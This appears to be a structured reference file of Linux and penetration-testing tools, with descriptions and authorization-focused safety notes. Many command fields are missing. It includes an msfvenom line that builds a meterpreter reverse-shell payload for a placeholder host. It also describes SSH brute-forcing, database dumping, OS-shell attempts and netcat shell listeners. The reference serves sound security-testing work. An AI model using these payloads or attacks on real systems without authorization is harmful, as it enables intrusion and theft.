tools.name: nmap
tools.description: Nmap (Network Mapper) is a free and open-source utility for network discovery and security auditing. It sends packets and analyzes responses to map networks, find live hosts, open ports, running services, and operating systems.

commands.task: scan common ports on a target
commands.description: Default SYN scan of the top 1000 ports.
Stealth SYN scan on all 65535 ports.
Probe open ports to determine service/version info.
Enable OS detection (requires root for best results).
Run a safe set of NSE scripts.
Full SYN scan with version, scripts, and OS detection.
Scan every host in the CIDR range.
Output in normal, XML, and grepable formats.

flags.description: Stealth SYN scan (default for privileged users)
Connect scan (used when raw packets are not possible)

tools.safety_notes: Only scan networks and hosts you own or have explicit written permission to test. Unauthorized scanning may be illegal or violate terms of service.

tools.name: netdiscover
tools.description: Netdiscover is an active/passive ARP reconnaissance tool. It is useful for finding live hosts on a local network without needing to send ICMP packets.

commands.task: discover live hosts on local network
commands.description: Active ARP scan on the given interface and range.
Listen to ARP traffic without sending packets.
Read target ranges from a file.

tools.safety_notes: Use only on networks you administer. Active ARP scanning can trigger IDS/IPS alerts.

tools.name: netcat
tools.description: Netcat (nc) is a versatile networking utility for reading/writing network connections using TCP or UDP. It is often called the 'Swiss Army knife' of networking.
tools.install: sudo apt install netcat-traditional # or netcat-openbsd

commands.description: Open a TCP connection to port 80.
Listen on port 4444 in verbose mode without resolving DNS.
Retrieve a service banner from a TCP port.
Receive a file over the network. Sender: nc <ip> 1234 < file.txt
Simple TCP port scan of the first 1000 ports.
Listen for an incoming shell connection.

tools.safety_notes: Never expose netcat listeners to untrusted networks. Reverse/bind shells can be illegal if used without authorization.

tools.name: tcpdump
tools.description: Tcpdump is a powerful command-line packet analyzer. It captures and inspects network traffic in real time.

commands.description: Write captured packets to a pcap file.
Read packets from a saved pcap file.
Show only traffic to/from a specific host.

flags.description: Do not resolve hostnames or port names
Print payload in hex and ASCII

tools.safety_notes: Capture only traffic you are authorized to monitor. Packet capture on shared networks may violate privacy laws.

tools.name: arp-scan
tools.description: Arp-scan sends ARP packets to hosts on the local network and displays responses, making it easy to find live devices.

commands.description: Scan all hosts on local network interfaces.

tools.safety_notes: Only use on networks you own or manage. ARP scans are detectable by network security tools.

tools.name: masscan
tools.description: Masscan is an Internet-scale port scanner, much faster than nmap for large ranges, but less detailed.

commands.description: Scan the entire IPv4 space on port 80 (extreme).
Fast scan of a local network.

tools.safety_notes: Masscan can generate huge traffic. Only use on authorized networks and with appropriate rate limits.

tools.name: traceroute
tools.description: Traceroute shows the route (network hops) that packets take to reach a target host.
tools.install: usually pre-installed; sudo apt install traceroute if missing

commands.description: Use ICMP echo requests instead of UDP.
Use TCP SYN for tracing (useful for firewalled hosts).

tools.safety_notes: Traceroute is generally safe, but some networks may block or log it.

tools.name: ping
tools.description: Ping tests connectivity to a host by sending ICMP echo requests and waiting for replies.
tools.install: usually pre-installed; sudo apt install iputils-ping if missing

commands.description: Send ICMP pings until stopped with Ctrl+C.
Send pings via a specific interface.

tools.safety_notes: Ping is safe and commonly used, but ICMP may be blocked by firewalls.

tools.name: ip
tools.description: The 'ip' command is the modern replacement for ifconfig. It is used to show and manipulate routing, network devices, interfaces, and tunnels.

commands.description: Display all network interfaces and IP addresses.

commands.command: sudo ip link set eth0 up
sudo ip link set eth0 down
sudo ip addr add 192.168.1.50/24 dev eth0
commands.description: Assign a static IP to an interface.

tools.safety_notes: Changing network settings can disconnect you. Be careful when modifying interfaces remotely.

tools.name: ss
tools.description: ss is a utility to investigate sockets. It replaces netstat and is faster because it reads information directly from kernel.

commands.description: Show TCP listening sockets with process info.
Show UDP sockets with process info.

tools.safety_notes: Inspecting sockets is read-only and safe.

tools.name: lsof
tools.description: lsof (List Open Files) lists files opened by processes, including network sockets, devices, and regular files.

commands.description: List files opened by a specific PID.
Find which process is using port 443.

tools.safety_notes: lsof is read-only and safe to use.

tools.name: find
tools.description: find searches for files and directories in a directory hierarchy based on name, size, type, permissions, and more.
tools.install: usually pre-installed; sudo apt install findutils if missing

commands.description: Find all .py files in current directory.
Files modified in the last 24 hours.

tools.safety_notes: Be careful with -exec rm or -delete. Test without -delete first using -print.

tools.name: grep
tools.description: grep searches text for lines matching a regular expression. It is one of the most used Linux utilities.

commands.description: Show lines that do NOT match.

tools.safety_notes: grep is read-only. Avoid grepping sensitive files on systems you don't own.

tools.name: chmod
tools.description: chmod changes file and directory permissions (read, write, execute) for user, group, and others.

commands.description: Owner rwx, group and others r-x.

tools.safety_notes: Recursive chmod can break systems if used incorrectly. Double-check paths before applying.

tools.name: chown
tools.description: chown changes the owner and/or group of files and directories.

commands.description: Change owner of file.txt to user.

tools.safety_notes: Changing ownership of system files can break the OS. Be especially careful with recursive chown.

tools.name: ps
tools.description: ps reports a snapshot of current processes. It is often combined with grep or sort.

commands.description: Show all processes for all users in BSD format.
Show processes for a specific user.

tools.safety_notes: ps is read-only and safe.

tools.name: hydra
tools.description: Hydra is a fast network logon cracker supporting many protocols such as SSH, FTP, RDP, HTTP, and SMB.

commands.description: SSH brute-force with a user list and password list.
FTP brute-force with multiple users and passwords.

tools.safety_notes: Only use against systems you own or have explicit authorization to test. Unauthorized brute-forcing is illegal.

tools.name: nikto
tools.description: Nikto is a web server scanner that tests for dangerous files/CGIs, outdated server versions, and configuration issues.

commands.description: Basic Nikto scan against a web server.
Scan a web server on a non-standard port.

tools.safety_notes: Only scan web servers you have permission to test. Nikto generates visible log entries.

tools.name: gobuster
tools.description: Gobuster is a tool used to brute-force URIs (directories and files), DNS subdomains, and virtual host names.

commands.description: Search for files with specific extensions.

tools.safety_notes: Only brute-force targets you have permission to test. Respect rate limits to avoid denial-of-service.

tools.name: sqlmap
tools.description: Sqlmap is an open-source penetration testing tool that automates detection and exploitation of SQL injection flaws.

commands.description: Basic GET parameter SQL injection test.
Dump all tables from a database.
Attempt to get an OS shell (invasive).

tools.safety_notes: SQL injection testing can damage data. Only test applications you own or have written authorization to assess.

tools.name: enum4linux
tools.description: Enum4linux is a tool for enumerating information from Windows and Samba systems via SMB.
tools.safety_notes: Only enumerate systems you are authorized to test. SMB enumeration is logged by target systems.

tools.name: aircrack-ng
tools.description: Aircrack-ng is a suite of tools for auditing wireless networks: monitoring, attacking, testing, and cracking WEP/WPA keys.

commands.description: Scan for Wi-Fi networks in monitor mode.
Crack a captured WPA handshake using a wordlist.

tools.safety_notes: Wireless auditing is heavily regulated. Only test networks you own or have explicit written permission to audit.

tools.name: searchsploit
tools.description: SearchSploit is a command-line search tool for Exploit-DB, useful for finding public exploits for known vulnerabilities.

commands.description: Show full path to an exploit.
Copy exploit source to current directory.

tools.safety_notes: Exploit code may be dangerous. Only run it in isolated lab environments on systems you own.

tools.name: ssh
tools.description: SSH (Secure Shell) provides encrypted remote login and command execution over a network.
tools.install: usually pre-installed; sudo apt install openssh-client if missing

commands.description: Log in to a remote host.
Execute a command remotely without logging in.

tools.safety_notes: Only connect to systems you are authorized to access. Protect private keys with strong passphrases.

tools.name: curl
tools.description: curl transfers data from or to a server using various protocols. It is commonly used for HTTP requests and API testing.
tools.install: usually pre-installed; sudo apt install curl if missing

commands.description: Send a POST request with data.

tools.safety_notes: curl can send data to any server. Be cautious with -k and sensitive headers.

tools.name: tar
tools.description: tar creates and extracts archive files (commonly .tar, .tar.gz, .tgz).
tools.safety_notes: Be careful extracting archives as root; tar can overwrite system files if the archive contains absolute paths.

tools.name: apt
tools.description: apt is the Debian/Ubuntu package manager used to install, update, and remove software packages.

commands.description: Remove a package but keep config.

examples: sudo apt update && sudo apt upgrade -y
tools.safety_notes: Use apt only on systems you administer. Upgrades may restart services.

tools.name: systemctl
tools.description: systemctl controls systemd services, targets, and the system state.
tools.safety_notes: Stopping or disabling critical services may lock you out of remote systems.

tools.name: kill
tools.description: kill sends signals to processes, usually to terminate them.

commands.description: Kill all processes with matching name.

tools.safety_notes: Killing system processes can crash the system or disconnect sessions.

tools.name: sed
tools.description: sed is a stream editor for filtering and transforming text.
tools.safety_notes: sed -i modifies files directly; back up important files first.

tools.name: awk
tools.description: awk is a pattern scanning and text processing language for columnar data.

commands.description: Rows where third column equals root.

tools.safety_notes: Read-only unless redirected to a file.

tools.name: dig
tools.description: dig (Domain Information Groper) queries DNS servers for DNS records.

commands.description: Query A records for a domain.

tools.safety_notes: DNS queries are generally safe but can leak information on monitored networks.

tools.name: wget
tools.description: wget is a command-line utility for downloading files from the web.
tools.safety_notes: Only download from trusted sources. Skipping SSL checks is risky.

tools.name: scp
tools.description: scp securely copies files between hosts over SSH.

commands.description: Upload a file to a remote server.
Download a file from a remote server.

tools.safety_notes: Ensure you have authorization to access the remote host.

tools.name: rsync
tools.description: rsync is a fast file copying and synchronization tool supporting remote and local transfers.

commands.description: Sync local files to remote over SSH.
Show what would transfer without changes.

tools.safety_notes: --delete can remove files on destination; use -n dry-run first.

tools.name: tshark
tools.description: tshark is the command-line version of Wireshark for capturing and analyzing network traffic.

commands.description: Capture live packets on an interface.

tools.safety_notes: Only capture traffic you are authorized to monitor. Captures can grow large.

tools.name: metasploit
tools.description: Metasploit Framework is a penetration testing platform for developing and executing exploit code.
examples: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf > payload.elf
tools.safety_notes: Use Metasploit only on systems you own or have explicit written authorization to test.

tools.name: john
tools.description: John the Ripper is a password cracking tool supporting many hash formats.
tools.safety_notes: Only crack hashes you own or have authorization to crack.

tools.name: hashcat
tools.description: hashcat is a fast GPU-based password recovery utility.
tools.safety_notes: Only crack hashes you own or have authorization to crack.

tools.name: wpscan
tools.description: WPScan is a WordPress security scanner for users, plugins, themes, and vulnerabilities.
tools.safety_notes: Only scan WordPress sites you own or have permission to test.

tools.name: ffuf
tools.description: ffuf (Fuzz Faster U Fool) is a fast web fuzzer for directories, files, parameters, and virtual hosts.
tools.safety_notes: Web fuzzing can generate high traffic. Only target authorized systems.

tools.name: dnsrecon
tools.description: dnsrecon is a DNS enumeration and reconnaissance tool.
tools.safety_notes: Only enumerate domains you own or have permission to assess.
